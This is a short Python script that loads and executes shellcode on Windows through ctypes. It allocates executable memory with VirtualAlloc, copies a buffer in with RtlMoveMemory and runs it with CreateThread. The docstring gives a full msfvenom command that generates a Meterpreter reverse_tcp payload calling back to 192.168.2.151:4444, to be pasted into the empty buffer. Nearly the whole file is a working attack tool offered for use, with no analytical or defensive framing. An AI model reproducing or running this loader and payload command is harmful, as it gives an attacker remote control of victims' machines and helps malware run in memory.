#!/usr/bin/python

"""
Generate ShellCode

Generate shellcode using MSVenom and replace line 14

$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.151 LPORT=4444 -e none -f python

"""

import ctypes

buf = ""

shellcode = bytearray(buf)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000), ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0),
                                         ctypes.c_int(ptr), ctypes.c_int(0),
                                         ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
